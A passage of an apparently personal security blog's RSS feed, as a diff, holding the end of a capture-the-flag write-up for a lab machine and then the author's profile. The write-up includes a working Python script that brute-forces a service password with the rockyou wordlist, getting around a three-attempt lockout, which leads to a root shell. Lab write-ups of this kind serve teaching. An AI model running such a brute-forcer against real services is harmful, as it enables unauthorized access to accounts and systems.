+&lt;ul&gt;
+&lt;li&gt;Does not contain &amp;ldquo;is not defined&amp;rdquo; : This is the response we got earlier for an invalid endpoint&lt;/li&gt;
+&lt;li&gt;Does not contain &amp;ldquo;&lt;code&gt;&amp;lt;string&amp;gt;&lt;/code&gt;&amp;rdquo; : For some words, the server will return and error usually containing &amp;ldquo;&lt;code&gt;&amp;lt;string&amp;gt;&lt;/code&gt;&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;Is not empty&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It is considered a potential valid endpoint and the script prompt us if we want to continue or not.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/endpoint_fuzz_script.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Running the script&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After running the script, we eventually get the right endpoint. Let’s try it!&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/entering_valid_endpoint.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Trying the valid endpoint&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We are prompted for a password…&lt;/p&gt;
+&lt;p&gt;If we go back to the room’s description:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;We see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/3_wrong_pass.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Trying invalid passwords&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/re_enter_valid_endpoint.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;After re-entering the valid endpoint&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After re-entering the valid endpoint, we get prompted for the password again…&lt;/p&gt;
+&lt;p&gt;So our script has to send the valid endpoint, try 3 passwords, send the valid endpoint, try 3 passwords, so on and so forth.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;652981374&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;652981374&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Password Brute-Force&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+import socket
+import time
+import os
+
+# Defining variables
+RHOST = &amp;#34;10.10.137.243&amp;#34;
+RPORT = 8000
+WORDLIST_PATH = &amp;#34;/opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt&amp;#34;
+
+# Connecting to socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3.0)
+s.connect((RHOST, RPORT))
+
+# Opening the wordlist file
+wlist = open(WORDLIST_PATH, &amp;#34;r&amp;#34;)
+
+# Creating temporary wordlist
+temp_wlist = open(&amp;#34;/tmp/tmp_wlist&amp;#34;, &amp;#34;a&amp;#34;)
+for index, password in enumerate(wlist):
+    if index % 3 == 0:
+        temp_wlist.write(&amp;#34;&amp;lt;REDACTED&amp;gt;\n&amp;#34;)
+    temp_wlist.write(password)
+
+# Closing wordlist files
+wlist.close()
+temp_wlist.close()
+
+# Looping through temporary wordlist file
+temp_wlist = open(&amp;#34;/tmp/tmp_wlist&amp;#34;, &amp;#34;r&amp;#34;)
+for line in temp_wlist.readlines():
+    time.sleep(0.5)
+    print(f&amp;#34;[i] Trying {line.strip()}&amp;#34;)
+    try:
+        s.sendall(line.strip().encode())
+        response = s.recv(1024).decode()
+
+        if response != &amp;#34;Password:\n&amp;#34;:
+            print(f&amp;#34;[&amp;#43;] {line.strip()} might be the password. It returned: {response}&amp;#34;)
+            choice = input(&amp;#34;Continue? [y/n] -&amp;gt; &amp;#34;)
+            if choice != &amp;#34;y&amp;#34;:
+                exit(0)
+    except socket.timeout:
+        print(&amp;#34;[-] Response timeout!&amp;#34;)
+        continue
+
+# Closing temporary wordlist file
+temp_wlist.close()
+
+# Deleting temporary file
+os.system(&amp;#34;rm /tmp/tmp_wlist&amp;#34;)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the &lt;code&gt;WORDLIST_PATH&lt;/code&gt; variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Original wordlist&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass4
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Temporary wordlist&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;REDACTED&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;REDACTED&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass4
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pass5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;&amp;lt;REDACTED&amp;gt;&lt;/code&gt; being the valid endpoint.&lt;/p&gt;
+&lt;p&gt;If we run the script:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/brute_force_script.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Running the script&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Well, looks like we got it…&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/thm/pyrat/root_flag.webp&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We spawn a shell as root and get the root flag at &lt;code&gt;/root/root.txt&lt;/code&gt;.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Whoami</title>
+      <link>//localhost:1313/whoami/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/whoami/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;m a cybersecurity student specialized in offensive security.&lt;/p&gt;
+&lt;p&gt;I have experience in the following fields:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Web security&lt;/strong&gt;: OWASP Top 10 vulnerabilities, API Security&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Active Directory&lt;/strong&gt;: Enumeration and common attacks&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Host Hacking&lt;/strong&gt;: Common privilege escalation in Windows &amp;amp; Linux hosts&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Programming &amp;amp; Scripting&lt;/strong&gt;: C, Go, Python, Bash&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Certifications:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://certs.ine.com/ff61eb26-147e-4723-8a61-03081d84034a&#34;&gt;eJPT&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Profiles:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;YesWeHack: &lt;a href=&#34;https://yeswehack.com/hunters/squ4r00t&#34;&gt;https://yeswehack.com/hunters/squ4r00t&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;HackTheBox: &lt;a href=&#34;https://app.hackthebox.com/profile/1634933&#34;&gt;https://app.hackthebox.com/profile/1634933&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;TryHackMe: &lt;a href=&#34;https://tryhackme.com/r/p/squ4r00t&#34;&gt;https://tryhackme.com/r/p/squ4r00t&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Tools &amp;amp; Projects&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;SPS&lt;/a&gt;: SimplePortScanner is a TCP port scanner written in golang with the ability to run the scan from another host.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/squ4r00t/Corscanner&#34;&gt;Corscanner&lt;/a&gt;: Simple Python script to scan URLs for CORS misconfigurations&lt;/li&gt;
+&lt;/ul&gt;</description>
+      <content>&lt;p&gt;I&amp;rsquo;m a cybersecurity student specialized in offensive security.&lt;/p&gt;
+&lt;p&gt;I have experience in the following fields:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Web security&lt;/strong&gt;: OWASP Top 10 vulnerabilities, API Security&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Active Directory&lt;/strong&gt;: Enumeration and common attacks&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Host Hacking&lt;/strong&gt;: Common privilege escalation in Windows &amp;amp; Linux hosts&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Programming &amp;amp; Scripting&lt;/strong&gt;: C, Go, Python, Bash&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Certifications:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://certs.ine.com/ff61eb26-147e-4723-8a61-03081d84034a&#34;&gt;eJPT&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Profiles:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;YesWeHack: &lt;a href=&#34;https://yeswehack.com/hunters/squ4r00t&#34;&gt;https://yeswehack.com/hunters/squ4r00t&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;HackTheBox: &lt;a href=&#34;https://app.hackthebox.com/profile/1634933&#34;&gt;https://app.hackthebox.com/profile/1634933&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;TryHackMe: &lt;a href=&#34;https://tryhackme.com/r/p/squ4r00t&#34;&gt;https://tryhackme.com/r/p/squ4r00t&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Tools &amp;amp; Projects&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;SPS&lt;/a&gt;: SimplePortScanner is a TCP port scanner written in golang with the ability to run the scan from another host.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/squ4r00t/Corscanner&#34;&gt;Corscanner&lt;/a&gt;: Simple Python script to scan URLs for CORS misconfigurations&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
